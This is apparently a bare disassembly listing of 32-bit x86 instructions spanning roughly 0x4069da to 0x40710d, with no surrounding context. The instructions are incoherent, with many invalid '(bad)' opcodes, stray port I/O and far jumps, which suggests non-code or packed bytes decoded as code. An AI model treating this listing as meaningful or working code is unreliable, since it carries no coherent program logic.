  4069da:	fcom   DWORD PTR [edi+ebp*1+0x1bf3c21f]
  4069e1:	xor    edi,ecx
  4069e3:	outs   dx,BYTE PTR ds:[esi]
  4069e4:	jbe    0x4069e2
  4069e6:	cmc    
  4069e7:	rcr    ebx,cl
  4069e9:	sbb    bl,BYTE PTR [eax-0x67]
  4069ec:	inc    ebx
  4069ed:	aas    
  4069ee:	(bad)  
  4069f0:	aad    0x0
  4069f2:	xchg   ebx,eax
  4069f3:	mov    edi,0x952cdd8b
  4069f8:	xor    esi,DWORD PTR [edi-0xa91f53a]
  4069fe:	scas   al,BYTE PTR es:[edi]
  4069ff:	jbe    0x4069fc
  406a01:	out    0x87,al
  406a03:	ds inc edi
  406a05:	ins    DWORD PTR es:[edi],dx
  406a06:	or     al,0xfb
  406a08:	adc    eax,0xe064f085
  406a0d:	out    dx,eax
  406a0e:	xor    BYTE PTR [ecx+ecx*4+0x1ab101ca],ch
  406a15:	(bad)  
  406a16:	out    dx,al
  406a17:	outs   dx,DWORD PTR ds:[esi]
  406a18:	sub    bl,dh
  406a1a:	dec    edx
  406a1b:	ins    BYTE PTR es:[edi],dx
  406a1c:	in     eax,dx
  406a1d:	mov    edi,0x946f4876
  406a22:	sbb    DWORD PTR [edx],0x52
  406a25:	jnp    0x406a90
  406a27:	xchg   edi,eax
  406a28:	cmp    eax,0xb7d4266b
  406a2d:	call   0x8bdd577f
  406a32:	inc    edx
  406a33:	jmp    0xd4fb:0x7123f6e1
  406a3a:	inc    edx
  406a3b:	inc    esi
  406a3c:	adc    BYTE PTR [eax+0x32bc250b],dl
  406a42:	pop    edx
  406a43:	jecxz  0x406a26
  406a45:	data16 jp 0x406a0b
  406a48:	inc    edx
  406a49:	push   edx
  406a4a:	test   BYTE PTR [edi+0x7c],cl
  406a4d:	jmp    0x4069f5
  406a4f:	add    esi,ebx
  406a51:	dec    ebp
  406a52:	mov    edi,0x56adcaf5
  406a57:	sbb    al,0x1a
  406a59:	inc    ebx
  406a5a:	push   edx
  406a5b:	daa    
  406a5c:	into   
  406a5d:	test   al,0x77
  406a5f:	inc    ebx
  406a60:	sbb    ebx,DWORD PTR [edx+0x3c]
  406a63:	into   
  406a64:	add    DWORD PTR [esi+ecx*1],eax
  406a67:	xchg   ebp,eax
  406a68:	jnp    0x406ab6
  406a6a:	inc    ebp
  406a6b:	repnz loope 0x406a9e
  406a6e:	ins    BYTE PTR es:[edi],dx
  406a6f:	pop    edx
  406a70:	lds    edi,FWORD PTR [esi-0x249cc5b9]
  406a76:	out    0xd7,eax
  406a78:	ins    BYTE PTR es:[edi],dx
  406a79:	neg    ch
  406a7b:	mov    eax,0xd0036652
  406a80:	inc    esi
  406a81:	das    
  406a82:	xor    BYTE PTR [ebx],0x13
  406a85:	adc    DWORD PTR [esi-0x19ff7917],edx
  406a8b:	dec    ecx
  406a8c:	enter  0xafac,0x32
  406a90:	push   edi
  406a91:	rcl    cl,cl
  406a93:	outs   dx,DWORD PTR ds:[esi]
  406a94:	jecxz  0x406abd
  406a96:	shl    DWORD PTR [edi],1
  406a98:	je     0x406a87
  406a9a:	dec    esi
  406a9b:	out    0xb4,al
  406a9d:	adc    esp,edx
  406a9f:	aam    0x75
  406aa1:	mov    ebx,DWORD PTR [eax+0x57]
  406aa4:	outs   dx,DWORD PTR ds:[esi]
  406aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aa6:	lock stos BYTE PTR es:[edi],al
  406aa8:	pop    ss
  406aa9:	xchg   esp,eax
  406aaa:	mov    esi,0x437ca3e0
  406aaf:	call   0xa9b6:0xf4d8e2b8
  406ab6:	sbb    ah,BYTE PTR [edx+ebp*4-0x2067a4b1]
  406abd:	fdiv   st,st(3)
  406abf:	or     al,0x27
  406ac1:	push   ecx
  406ac2:	mov    cl,0xaa
  406ac4:	cmp    BYTE PTR [ebp+0x0],bl
  406ac7:	pop    esi
  406ac8:	sub    ah,dh
  406aca:	hlt    
  406acb:	daa    
  406acc:	pop    ebx
  406acd:	xchg   ebp,eax
  406ace:	cmp    ch,cl
  406ad0:	push   eax
  406ad1:	rcr    BYTE PTR [ebp-0x2d],0xf4
  406ad5:	fs push es
  406ad7:	ins    BYTE PTR es:[edi],dx
  406ad8:	jae    0x406b02
  406ada:	adc    al,0xdf
  406adc:	pusha  
  406add:	and    DWORD PTR [esp+edx*4-0x20],ebp
  406ae1:	aam    0x27
  406ae3:	jge    0x406aa8
  406ae5:	lods   al,BYTE PTR ds:[esi]
  406ae6:	or     al,0x2c
  406ae8:	inc    edi
  406ae9:	(bad)  
  406aeb:	cmp    ecx,DWORD PTR [ecx]
  406aed:	inc    edx
  406aee:	push   ds
  406aef:	test   BYTE PTR [ebx+0x6102982c],bh
  406af5:	test   DWORD PTR [eax],esp
  406af7:	daa    
  406af8:	popa   
  406af9:	sbb    al,0x4b
  406afb:	cdq    
  406afc:	out    dx,al
  406afd:	add    DWORD PTR [edx+0x24ca8034],edx
  406b03:	je     0x406abd
  406b05:	mov    ebx,0x62358607
  406b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b0b:	lods   eax,DWORD PTR ds:[esi]
  406b0c:	mov    esi,?
  406b0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b0f:	fbld   TBYTE PTR [ecx-0x41]
  406b12:	push   ebp
  406b13:	inc    edx
  406b14:	jne    0x406ad9
  406b16:	xor    bl,BYTE PTR [edx]
  406b18:	scas   al,BYTE PTR es:[edi]
  406b19:	outs   dx,DWORD PTR ds:[esi]
  406b1a:	mov    bh,0xc6
  406b1c:	pushf  
  406b1d:	popf   
  406b1e:	jmp    0x406b87
  406b20:	test   eax,0x94c5a7fd
  406b25:	aam    0x29
  406b27:	(bad)  
  406b28:	retf   
  406b29:	jg     0x406ab4
  406b2b:	mov    bh,0x76
  406b2d:	push   edx
  406b2e:	inc    esi
  406b2f:	std    
  406b30:	stos   DWORD PTR es:[edi],eax
  406b31:	xchg   esp,eax
  406b32:	int3   
  406b33:	push   es
  406b34:	js     0x406b0d
  406b36:	repz sbb BYTE PTR [edx-0x9f2992],al
  406b3d:	mov    ah,0xa8
  406b3f:	dec    esp
  406b40:	pushf  
  406b41:	iret   
  406b42:	mov    ebx,DWORD PTR [edi]
  406b44:	push   esi
  406b45:	push   edi
  406b46:	push   ss
  406b47:	bound  esi,QWORD PTR [ecx-0x54024fc2]
  406b4d:	sub    al,0x1d
  406b4f:	push   edx
  406b50:	push   0xe
  406b52:	aas    
  406b53:	or     BYTE PTR [ebx+0x61a964c6],ch
  406b59:	addr16 in al,0xbf
  406b5c:	and    eax,edx
  406b5e:	mov    ah,0x9
  406b60:	sbb    ebp,eax
  406b62:	xchg   edx,eax
  406b63:	xchg   ebx,eax
  406b64:	retf   
  406b65:	das    
  406b66:	mov    cl,0xd0
  406b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b69:	push   ss
  406b6a:	sbb    ebp,DWORD PTR ds:0x4bbcadc1
  406b70:	mov    ds:0xdeee2823,al
  406b75:	jns    0x406b3c
  406b77:	and    dh,BYTE PTR [esp+esi*8]
  406b7a:	push   edi
  406b7b:	add    al,BYTE PTR [ecx-0xd410400]
  406b81:	imul   esp,edi,0xffffff91
  406b84:	ret    
  406b85:	repz (bad) 
  406b87:	in     al,0xa6
  406b89:	sbb    DWORD PTR [edx-0x6b],esi
  406b8c:	dec    edx
  406b8d:	pop    esp
  406b8e:	arpl   sp,cx
  406b90:	dec    esi
  406b91:	addr16 mov ebx,0xec34ffde
  406b97:	xchg   edx,eax
  406b98:	jecxz  0x406bf7
  406b9a:	adc    ebp,DWORD PTR [edx-0x3a]
  406b9d:	xlat   BYTE PTR ds:[ebx]
  406b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b9f:	das    
  406ba0:	jns    0x406bad
  406ba2:	adc    DWORD PTR [edi+0x6360e00c],ecx
  406ba8:	push   edi
  406ba9:	(bad)  
  406baa:	cli    
  406bab:	inc    ecx
  406bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bad:	not    BYTE PTR [edx]
  406baf:	cmp    bl,dh
  406bb1:	push   esp
  406bb2:	test   eax,0x8dd6bbdc
  406bb7:	jle    0x406c36
  406bb9:	arpl   WORD PTR [edx],dx
  406bbb:	mov    edx,0xfbdbfb87
  406bc0:	xchg   ecx,eax
  406bc1:	into   
  406bc2:	push   es
  406bc3:	xlat   BYTE PTR ds:[ebx]
  406bc4:	dec    ecx
  406bc5:	enter  0x4873,0x91
  406bc9:	sub    al,0x42
  406bcb:	xchg   ecx,eax
  406bcc:	lahf   
  406bcd:	test   DWORD PTR [ebx-0x10a6db76],edi
  406bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bd4:	les    ecx,FWORD PTR [edi+edi*4+0x52]
  406bd8:	mov    dh,0x92
  406bda:	sbb    edx,ebx
  406bdc:	push   ebp
  406bdd:	pushf  
  406bde:	stos   DWORD PTR es:[edi],eax
  406bdf:	push   edx
  406be0:	(bad)  
  406be1:	jmp    0xecebcfec
  406be6:	or     BYTE PTR [esi+0x69f6e2f],dh
  406bec:	mov    ch,bh
  406bee:	mov    ch,0x65
  406bf0:	in     al,dx
  406bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bf2:	xor    DWORD PTR [ecx],ecx
  406bf4:	add    al,0xbe
  406bf6:	xor    BYTE PTR ds:0x438f6c02,dl
  406bfc:	or     BYTE PTR [ecx+0x610cad0e],0x6f
  406c03:	stc    
  406c04:	div    edx
  406c06:	mov    dl,0x9e
  406c08:	mov    bh,0x70
  406c0a:	ins    DWORD PTR es:[edi],dx
  406c0b:	je     0x406c49
  406c0d:	test   DWORD PTR [ebx-0x31e74e56],esp
  406c13:	jl     0x406c93
  406c15:	imul   cx,WORD PTR [edi],0xacd9
  406c1a:	pop    edi
  406c1b:	push   esi
  406c1c:	cmp    al,0x29
  406c1e:	cwde   
  406c1f:	fdivr  DWORD PTR [ebx+ecx*8]
  406c22:	(bad)  
  406c23:	ret    0xa5ce
  406c26:	push   es
  406c27:	add    DWORD PTR [ebx],ecx
  406c29:	or     al,0x22
  406c2b:	outs   dx,BYTE PTR ds:[esi]
  406c2c:	imul   edx,DWORD PTR [edi+0x4c],0xe4eb00a1
  406c33:	dec    ecx
  406c34:	aad    0x64
  406c36:	jg     0x406c17
  406c38:	inc    edi
  406c39:	mov    WORD PTR [ecx],?
  406c3b:	ret    0x25db
  406c3e:	ins    DWORD PTR es:[edi],dx
  406c3f:	pop    ds
  406c40:	into   
  406c41:	sbb    DWORD PTR [esi],0xd
  406c44:	pop    ss
  406c45:	xlat   BYTE PTR ds:[ebx]
  406c46:	ret    
  406c47:	stos   DWORD PTR es:[edi],eax
  406c48:	in     eax,0xb6
  406c4a:	pushf  
  406c4b:	jp     0x406c6d
  406c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c4e:	inc    ebp
  406c4f:	fisubr DWORD PTR [edx]
  406c51:	or     ecx,DWORD PTR [eax]
  406c53:	mov    ah,0x33
  406c55:	test   al,0x68
  406c57:	data16 clc 
  406c59:	cwde   
  406c5a:	pop    ebp
  406c5b:	mov    ds:0xf649ee85,eax
  406c60:	ficomp DWORD PTR [esi]
  406c62:	lea    eax,[eax-0x1b07c14]
  406c68:	xchg   ecx,eax
  406c69:	scas   eax,DWORD PTR es:[edi]
  406c6a:	aam    0x4e
  406c6c:	mov    ebx,0xa7d8fd1d
  406c71:	mov    eax,ds:0x68a81aeb
  406c76:	or     cl,BYTE PTR [edi+0x75]
  406c79:	inc    esi
  406c7a:	jg     0x406c87
  406c7c:	enter  0xecb2,0x15
  406c80:	add    bl,BYTE PTR [esi+ebx*2-0x3d40963b]
  406c87:	out    dx,eax
  406c88:	xchg   ecx,eax
  406c89:	and    DWORD PTR [edx+eiz*8],ebx
  406c8c:	jecxz  0x406c37
  406c8e:	xchg   edx,eax
  406c8f:	cmp    dl,BYTE PTR [ebp+0x8198302]
  406c95:	dec    esi
  406c96:	and    DWORD PTR [esi-0x4626601a],esp
  406c9c:	dec    esp
  406c9d:	xchg   edx,eax
  406c9e:	xchg   BYTE PTR [esi+eax*4],bh
  406ca1:	cmp    ch,BYTE PTR [esi+0x40]
  406ca4:	jne    0x406cc5
  406ca6:	fimul  DWORD PTR [ecx-0x39ee5030]
  406cac:	xor    DWORD PTR [eax+edi*4+0x7e],ebx
  406cb0:	sub    DWORD PTR ds:0xf10f88ec,edx
  406cb6:	daa    
  406cb7:	stos   DWORD PTR es:[edi],eax
  406cb8:	mov    edx,0x15abddb3
  406cbd:	loope  0x406c63
  406cbf:	dec    DWORD PTR [edx-0x2a431907]
  406cc5:	inc    edx
  406cc6:	push   0xffffffde
  406cc8:	(bad)  
  406cc9:	sahf   
  406cca:	jae    0x406d1f
  406ccc:	dec    DWORD PTR [esi+ebp*8+0x39]
  406cd0:	shl    cl,0x16
  406cd3:	std    
  406cd4:	into   
  406cd5:	in     al,0x57
  406cd7:	out    0xfb,al
  406cd9:	xor    ebp,DWORD PTR [ebx+eax*1-0x3ee04443]
  406ce0:	test   al,0x4c
  406ce2:	xor    BYTE PTR [ebx],cl
  406ce4:	mov    bh,0xd7
  406ce6:	dec    edx
  406ce7:	mov    eax,0x224cb9b7
  406cec:	fistp  WORD PTR [ebp+ebx*1+0x55]
  406cf0:	cdq    
  406cf1:	adc    DWORD PTR [ebx+ebx*8+0x67],ebp
  406cf5:	test   dh,0x22
  406cf8:	add    DWORD PTR [esi+0x19a99812],esp
  406cfe:	(bad)  
  406cff:	(bad)  
  406d00:	out    dx,al
  406d01:	add    eax,0x54c91985
  406d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d07:	mov    eax,ds:0xd0924607
  406d0c:	jl     0x406d7c
  406d0e:	pop    esi
  406d0f:	pop    ss
  406d10:	js     0x406d39
  406d12:	cmp    al,0x97
  406d14:	push   0xffffffbf
  406d16:	fcom   QWORD PTR [ebx]
  406d18:	mov    ebx,0xb2d15878
  406d1d:	mov    al,0x1
  406d1f:	jmp    0xacdd:0xab13c724
  406d26:	shl    DWORD PTR [edx],0x81
  406d29:	nop
  406d2a:	(bad)  
  406d2b:	out    dx,eax
  406d2c:	int3   
  406d2d:	lea    edi,cs:[ecx+ecx*1-0x7f]
  406d32:	stc    
  406d33:	mov    ds:0x1ba93a1a,al
  406d38:	sbb    eax,0x49ee6880
  406d3d:	jo     0x406d3e
  406d3f:	cld    
  406d40:	add    bl,BYTE PTR [esp+edx*8+0x21]
  406d44:	and    ebx,DWORD PTR [ecx]
  406d46:	sahf   
  406d47:	xor    edi,DWORD PTR [esi]
  406d49:	iret   
  406d4a:	fwait
  406d4b:	or     BYTE PTR [edi+0x5c],al
  406d4e:	not    dh
  406d50:	retf   0x793c
  406d53:	mov    ch,0xf8
  406d55:	jecxz  0x406db2
  406d57:	rcr    al,cl
  406d59:	push   0xeacbde95
  406d5e:	loop   0x406d0f
  406d60:	lea    eax,[eax]
  406d62:	cld    
  406d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d64:	outs   dx,DWORD PTR ds:[esi]
  406d65:	cmp    eax,0xe6a91e11
  406d6a:	xchg   ecx,eax
  406d6b:	jg     0x406d24
  406d6d:	cli    
  406d6e:	adc    BYTE PTR [eax+0x4a],0x8b
  406d72:	rol    DWORD PTR [ecx+0x6e],cl
  406d75:	pop    ss
  406d76:	mov    DWORD PTR cs:[esi+edx*2-0x10],ebx
  406d7b:	or     BYTE PTR [ebx],cl
  406d7d:	or     BYTE PTR [edx-0x32],dh
  406d80:	(bad)  [ecx-0x7b394cfc]
  406d86:	pop    esi
  406d87:	outs   dx,DWORD PTR ds:[esi]
  406d88:	and    eax,0x6a042ece
  406d8d:	les    esi,FWORD PTR [edi]
  406d8f:	test   dl,dl
  406d91:	int    0x32
  406d93:	cmp    DWORD PTR [edx-0x3d],ecx
  406d96:	mov    al,0xcb
  406d98:	sbb    eax,0x2afec324
  406d9d:	ret    0x96e3
  406da0:	dec    ecx
  406da1:	jecxz  0x406e0f
  406da3:	adc    ch,BYTE PTR [ecx]
  406da5:	xor    al,0x4
  406da7:	cmc    
  406da8:	xlat   BYTE PTR ds:[ebx]
  406da9:	sar    BYTE PTR [esi+0x4956c866],1
  406daf:	xlat   BYTE PTR ds:[ebx]
  406db0:	(bad)  
  406db2:	sub    ebx,DWORD PTR [edx-0x133385]
  406db8:	test   DWORD PTR [eax],0xd9a4a069
  406dbe:	sub    eax,0x9f8a09de
  406dc3:	xor    BYTE PTR [ebx],dl
  406dc5:	xchg   BYTE PTR [ebx+0x44],ah
  406dc8:	idiv   al
  406dca:	xchg   dl,bh
  406dcc:	dec    ecx
  406dcd:	xchg   esp,eax
  406dce:	mov    bl,0x97
  406dd0:	push   0x87eca8a
  406dd5:	inc    edx
  406dd6:	sub    BYTE PTR [edi+0x42f4ab6a],dh
  406ddc:	aaa    
  406ddd:	jle    0x406e57
  406ddf:	(bad)  
  406de0:	cli    
  406de1:	or     BYTE PTR [esi+0x65],0xdd
  406de5:	push   edi
  406de6:	cmp    edi,DWORD PTR [ebx+esi*8-0x60]
  406dea:	cmp    al,0x9e
  406dec:	dec    ebp
  406ded:	fs push es
  406def:	fbstp  TBYTE PTR [esi]
  406df1:	sbb    esi,ebp
  406df3:	or     eax,0xa77a0a3c
  406df8:	sti    
  406df9:	int    0xc9
  406dfb:	jle    0x406deb
  406dfd:	inc    eax
  406dfe:	mov    ah,0x62
  406e00:	(bad)  
  406e01:	mov    eax,ds:0xa7f9f6d2
  406e06:	or     al,0x82
  406e08:	push   eax
  406e09:	adc    al,bh
  406e0b:	shr    BYTE PTR [ebp+0x47],0xde
  406e0f:	pop    es
  406e10:	imul   eax,DWORD PTR [esi+0x5011e3e7],0xd7e1501c
  406e1a:	jne    0x406e4e
  406e1c:	sub    BYTE PTR [edi+0x1b],cl
  406e1f:	scas   eax,DWORD PTR es:[edi]
  406e20:	jecxz  0x406e0f
  406e22:	mov    edx,0xf157c5b4
  406e27:	inc    ebx
  406e28:	inc    ecx
  406e29:	pusha  
  406e2a:	inc    edx
  406e2b:	mov    dh,0x67
  406e2d:	pop    eax
  406e2e:	push   es
  406e2f:	inc    edi
  406e30:	jne    0x406e12
  406e32:	pop    esi
  406e33:	rcl    DWORD PTR [ebp-0x74926c7f],0xf0
  406e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e3b:	mov    bh,0xcf
  406e3d:	sub    edx,0x3e
  406e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e41:	lods   eax,DWORD PTR ds:[esi]
  406e42:	xchg   esp,eax
  406e43:	lods   eax,DWORD PTR ds:[esi]
  406e44:	jnp    0x406eb5
  406e46:	mov    edi,0x7727dbe0
  406e4b:	and    esp,esi
  406e4d:	mov    esp,0x53e3f863
  406e52:	add    al,0x0
  406e54:	adc    DWORD PTR [ebp+0x471fe08c],eax
  406e5a:	and    edi,DWORD PTR [edx+edi*4]
  406e5d:	jbe    0x406e0b
  406e5f:	xchg   ebp,eax
  406e60:	pop    edx
  406e61:	outs   dx,BYTE PTR ds:[esi]
  406e62:	jne    0x406e2c
  406e64:	into   
  406e65:	dec    edi
  406e66:	sbb    DWORD PTR [esi],eax
  406e68:	fisubr WORD PTR [edi-0x74]
  406e6b:	mov    WORD PTR [ecx+ebx*1-0x7e221157],cs
  406e72:	mov    edi,0xbb1fedc7
  406e77:	sar    ch,0x36
  406e7a:	pushf  
  406e7b:	call   0xbb53a247
  406e80:	mov    al,0x6c
  406e82:	loope  0x406ea9
  406e84:	pop    edi
  406e85:	shl    DWORD PTR [ecx+0x73],0xef
  406e89:	mov    BYTE PTR [eax-0x4563488],bl
  406e8f:	dec    edi
  406e90:	cmp    ebp,DWORD PTR [eax]
  406e92:	mov    WORD PTR [edi],fs
  406e94:	lds    ebp,FWORD PTR [ebx]
  406e96:	in     eax,dx
  406e97:	xor    BYTE PTR [eax+eax*4+0x119182e7],bl
  406e9e:	mov    dl,0xf6
  406ea0:	inc    ebx
  406ea1:	call   0xcaf4:0x5574e178
  406ea8:	and    BYTE PTR [edi-0x3c],al
  406eab:	pop    ecx
  406eac:	add    ecx,DWORD PTR [ebp+0x52dabf8c]
  406eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eb3:	sahf   
  406eb4:	outs   dx,DWORD PTR ds:[esi]
  406eb5:	dec    edx
  406eb6:	fisttp WORD PTR [eax+eax*1+0x7d]
  406eba:	in     al,dx
  406ebb:	xlat   BYTE PTR ds:[ebx]
  406ebc:	push   esp
  406ebd:	clc    
  406ebe:	and    bh,BYTE PTR [edi]
  406ec0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  406ec2:	dec    ebp
  406ec3:	xchg   ebp,edi
  406ec5:	ds dec bh
  406ec8:	in     eax,dx
  406ec9:	jmp    0x1bf:0x1f1c0166
  406ed0:	cmc    
  406ed1:	pop    ds
  406ed2:	jp     0x406e8a
  406ed4:	or     bh,al
  406ed6:	sub    DWORD PTR [esi],ebp
  406ed8:	je     0x406e6a
  406eda:	gs mov ecx,0xce64f616
  406ee0:	aam    0xc
  406ee2:	inc    esi
  406ee3:	adc    ah,dl
  406ee5:	call   0xb1d54633
  406eea:	aaa    
  406eeb:	mov    dl,0xb3
  406eed:	mov    ds:0x66b8c11c,eax
  406ef2:	and    edi,ebp
  406ef4:	jl     0x406ebb
  406ef6:	loopne 0x406f04
  406ef8:	js     0x406f4f
  406efa:	call   0x6c02:0xf76606a6
  406f01:	shl    BYTE PTR [ebx+0x4e],cl
  406f04:	or     DWORD PTR ds:0xe036e0af,ebp
  406f0a:	cs dec edx
  406f0c:	mov    dl,0xd2
  406f0e:	add    bh,BYTE PTR [eax-0x21]
  406f11:	ror    BYTE PTR [edi+0x1320fe7d],1
  406f17:	bound  eax,QWORD PTR [ebx]
  406f19:	push   eax
  406f1a:	dec    ebp
  406f1b:	test   DWORD PTR [edx],edx
  406f1d:	jnp    0x406f3b
  406f1f:	xchg   edx,eax
  406f20:	inc    ecx
  406f21:	jns    0x406f64
  406f23:	mov    bl,0xc3
  406f25:	and    al,BYTE PTR [edx]
  406f27:	jbe    0x406f49
  406f29:	fld    TBYTE PTR [ebx]
  406f2b:	aad    0x4
  406f2d:	mov    BYTE PTR [edi+edx*4-0x6ccebb43],bh
  406f34:	ds push edx
  406f36:	clc    
  406f37:	arpl   WORD PTR [ebx*1+0x7d2de3bd],ax
  406f3e:	fild   DWORD PTR [edx]
  406f40:	mov    cl,0x27
  406f42:	xchg   esp,eax
  406f43:	fs jle 0x406f9e
  406f46:	leave  
  406f47:	adc    eax,0xfed81ace
  406f4c:	shl    cl,0xa7
  406f4f:	sub    eax,DWORD PTR [eax+0x7a]
  406f52:	(bad)  
  406f53:	addr16 pop ebp
  406f55:	adc    BYTE PTR [ebp+ebp*2+0x75],0x6f
  406f5a:	daa    
  406f5b:	mov    DWORD PTR [ebx+0x2aaca17c],ebp
  406f61:	pop    esp
  406f62:	sti    
  406f63:	cmp    BYTE PTR ds:0x5bc51191,0xd
  406f6a:	pop    edi
  406f6b:	xchg   esp,esp
  406f6d:	inc    ebx
  406f6e:	xchg   ebp,eax
  406f6f:	retf   0xa3b0
  406f72:	sbb    ch,BYTE PTR [edx-0x39]
  406f75:	mov    cl,0x6
  406f77:	fnstsw WORD PTR [esi-0x73315a11]
  406f7d:	test   al,0x8
  406f7f:	xor    eax,0xef8c9c32
  406f84:	push   edi
  406f85:	mov    BYTE PTR [eax+0x2a310df7],dl
  406f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f8c:	cmp    ebx,0xfffffff8
  406f8f:	mov    BYTE PTR [ebp+0x6e],al
  406f92:	(bad)  
  406f93:	fcmove st,st(0)
  406f95:	xchg   edx,eax
  406f96:	push   ecx
  406f97:	jle    0x406f6f
  406f99:	jae    0x406f35
  406f9b:	popf   
  406f9c:	jnp    0x406f48
  406f9e:	pop    esp
  406f9f:	dec    ebp
  406fa0:	mov    gs,WORD PTR [edi]
  406fa2:	xchg   ebp,eax
  406fa3:	je     0x406fbc
  406fa5:	fstp   TBYTE PTR [esp+ebx*1+0x7c]
  406fa9:	mov    ah,0x92
  406fab:	mov    bl,0xeb
  406fad:	xor    BYTE PTR [ecx-0x70fef780],0x69
  406fb4:	mov    edi,esp
  406fb6:	dec    ecx
  406fb7:	adc    al,0xb6
  406fb9:	pop    es
  406fba:	mov    dl,0x61
  406fbc:	test   al,0xd5
  406fbe:	sub    bh,ch
  406fc0:	cli    
  406fc1:	xchg   DWORD PTR [edi-0x58945006],ebp
  406fc7:	shl    eax,0x5a
  406fca:	jg     0x406f62
  406fcc:	ins    DWORD PTR es:[edi],dx
  406fcd:	popa   
  406fce:	enter  0x4203,0xab
  406fd2:	sar    BYTE PTR [edx+0x69],1
  406fd5:	gs pop edi
  406fd7:	push   ebx
  406fd8:	je     0x406f67
  406fda:	mov    cl,0x26
  406fdc:	ins    BYTE PTR es:[edi],dx
  406fdd:	in     eax,0xe8
  406fdf:	inc    edx
  406fe0:	xor    BYTE PTR [edx-0x327a05d4],ah
  406fe6:	xchg   edx,eax
  406fe7:	xchg   DWORD PTR [esi-0x18],esp
  406fea:	ja     0x407016
  406fec:	imul   esp,DWORD PTR [ebx-0x316537f3],0x9fd82c05
  406ff6:	out    0xea,al
  406ff8:	fld    QWORD PTR [eax]
  406ffa:	sub    BYTE PTR [ecx-0xf243a5e],dl
  407000:	shl    ah,0x68
  407003:	or     al,0x6e
  407005:	inc    ebp
  407006:	lods   al,BYTE PTR ds:[esi]
  407007:	das    
  407008:	add    BYTE PTR [edi],bh
  40700a:	jg     0x40703d
  40700c:	sti    
  40700d:	aas    
  40700e:	les    ebx,FWORD PTR [eax+0x42]
  407011:	or     BYTE PTR [edi],cl
  407013:	mov    ah,0x9
  407015:	xchg   ecx,eax
  407016:	push   ebx
  407017:	or     edi,ebp
  407019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40701a:	(bad)  
  40701b:	fimul  WORD PTR [ebp-0x5550b852]
  407021:	push   esp
  407022:	mov    dl,0xb8
  407024:	popa   
  407025:	add    BYTE PTR [edx+0x2],al
  407028:	iret   
  407029:	or     bh,bh
  40702b:	mov    al,0x73
  40702d:	add    BYTE PTR [ebx],bh
  40702f:	jecxz  0x407082
  407031:	sbb    al,BYTE PTR [ecx+0x65]
  407034:	cmp    BYTE PTR [eax],al
  407036:	mov    ch,dh
  407038:	xchg   DWORD PTR [eax],edi
  40703a:	xchg   esi,eax
  40703b:	mov    dh,0xed
  40703d:	js     0x406ff4
  40703f:	inc    esi
  407040:	loope  0x4070ae
  407042:	ins    BYTE PTR es:[edi],dx
  407043:	inc    ebx
  407044:	outs   dx,BYTE PTR ds:[esi]
  407045:	loope  0x40708a
  407047:	stc    
  407048:	jecxz  0x4070b0
  40704a:	shr    BYTE PTR [esi-0x1fbe8925],1
  407050:	adc    al,0x9e
  407052:	dec    esp
  407053:	mov    ds:0x1c4b9903,eax
  407058:	aaa    
  407059:	rcr    DWORD PTR ds:0x97f2784e,1
  40705f:	cmp    eax,0xac976019
  407064:	mov    DWORD PTR [eax+0x9a87242],edx
  40706a:	fld    TBYTE PTR [edi+ecx*4]
  40706d:	test   DWORD PTR [esp+ecx*4-0xc],ebx
  407071:	(bad)  
  407072:	in     eax,0x2f
  407074:	pop    ss
  407075:	mov    ebx,0xbb4921f2
  40707a:	jg     0x407079
  40707c:	loop   0x40709b
  40707e:	pop    ecx
  40707f:	push   ebx
  407080:	or     al,ah
  407082:	mov    al,0x32
  407084:	push   edi
  407085:	std    
  407086:	loop   0x4070fc
  407088:	int3   
  407089:	inc    ebp
  40708a:	cmp    BYTE PTR [ebx-0x5c760f09],0xf4
  407091:	in     al,0xa3
  407093:	and    DWORD PTR [edi-0x11a1af99],esp
  407099:	xor    BYTE PTR [eax+0x7a339f09],cl
  40709f:	mov    ss,edx
  4070a1:	ja     0x40710b
  4070a3:	mov    esi,0xc1d80a5c
  4070a8:	mov    eax,ds:0x6393fabd
  4070ad:	stos   BYTE PTR es:[edi],al
  4070ae:	ins    BYTE PTR es:[edi],dx
  4070af:	pop    ebx
  4070b0:	jmp    0x40708d
  4070b2:	mov    ch,0xd5
  4070b4:	test   DWORD PTR [ebx-0x58],edx
  4070b7:	xor    dl,bl
  4070b9:	in     eax,dx
  4070ba:	cmp    eax,0x3fce5706
  4070bf:	loop   0x4070d2
  4070c1:	icebp  
  4070c2:	sahf   
  4070c3:	shl    DWORD PTR [esi+ebx*1-0x5fc147f5],0xed
  4070cb:	aas    
  4070cc:	sti    
  4070cd:	hlt    
  4070ce:	sub    bh,0xad
  4070d1:	aas    
  4070d2:	mov    bh,0xfc
  4070d4:	jmp    0x2a4a75c9
  4070d9:	call   0x3de11845
  4070de:	mov    ch,BYTE PTR [esi+0x51]
  4070e1:	out    0xe0,eax
  4070e3:	lea    esi,[esi-0x1284bd20]
  4070e9:	or     DWORD PTR [eax],edx
  4070eb:	nop/reserved BYTE PTR [edi-0x10]
  4070ef:	lds    eax,FWORD PTR [esi-0x377be0c7]
  4070f5:	xchg   edx,eax
  4070f6:	push   0xffffffd8
  4070f8:	stc    
  4070f9:	add    al,0x90
  4070fc:	sbb    al,0x80
  4070fe:	mov    eax,0xf9c8b058
  407103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407104:	arpl   WORD PTR [ecx],di
  407106:	(bad)  
  407107:	dec    edx
  407108:	adc    eax,0xff5a5b72
  40710d:	or     al,0x23
